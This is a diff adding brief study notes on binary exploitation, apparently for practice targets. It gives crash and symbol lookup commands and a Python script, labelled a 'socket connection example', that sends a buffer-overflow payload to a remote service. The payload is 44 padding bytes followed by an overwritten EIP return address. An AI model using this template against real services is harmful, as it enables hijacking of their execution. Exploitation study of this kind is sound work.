@@ -1,0 +1,25 @@
+sudo dmesg: get crash info
+readelf -s <filename>: show each variable and function addresses
+
+python socket connection example
+
+#!/usr/bin/env python3
+import socket
+import argparse
+import struct
+
+parser = argparse.ArgumentParser()
+parser.add_argument("host",type=str,help=<info>)
+parser.add_argument("port",type=int,help=<info>)
+args = parser.parse_args()
+
+offset = <num of offset>
+new_eip = struct.pack("<I", 0x080491F6) #0x080491F6: value from readelf -s
+payload = b"".join([b"A" * 44, new_eip, b"\n"])
+
+with socket.socket() as connection:
+  connection.connect((args.host,args.port))
+  connection.recv(4096).decode('utf-8')
+  connection.send(payload)
+  connection.recv(4096).decode('utf-8')
+  connection.recv(4096).decode('utf-8')
